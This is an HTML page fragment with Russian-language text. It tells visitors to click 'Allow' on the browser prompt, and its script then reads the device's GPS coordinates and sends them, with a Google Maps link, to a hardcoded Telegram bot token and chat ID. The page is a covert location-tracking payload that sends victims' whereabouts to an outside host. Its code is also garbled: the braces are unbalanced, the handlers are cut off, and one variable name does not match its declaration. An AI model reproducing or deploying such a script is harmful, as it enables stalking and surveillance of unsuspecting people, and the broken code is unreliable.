</head>
<body>

    <p>Пожалуйста, нажмите «Разрешить» в появившемся окне браузера.</p>

    <script>
        const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
        const CHAT_ID = "5328460264";

        if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
        function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const text = `📍 Координаты с телефона (браузер):\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${maps_link}`;

        document.getElementById("status").innerText = "Координаты получены! Отправляем...";

        // Отправляем данные прямо в Telegram через fetch
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;

        fetch(url)
        .then(response => {
        if (response.ok) {
        document.getElementById("status").innerText = "Успешно отправлено в Telegram! ✔️";
        } else {
        document.getElementById("status").innerText = "Ошибка отправки API Telegram.";

        .catch(err => {

        function(error) {
        document.getElementById("status").innerText = "Ошибка: " + error.message + " (возможно, вы отклонили запрос).";

        );
        } else {

        }
    </script>
</body>
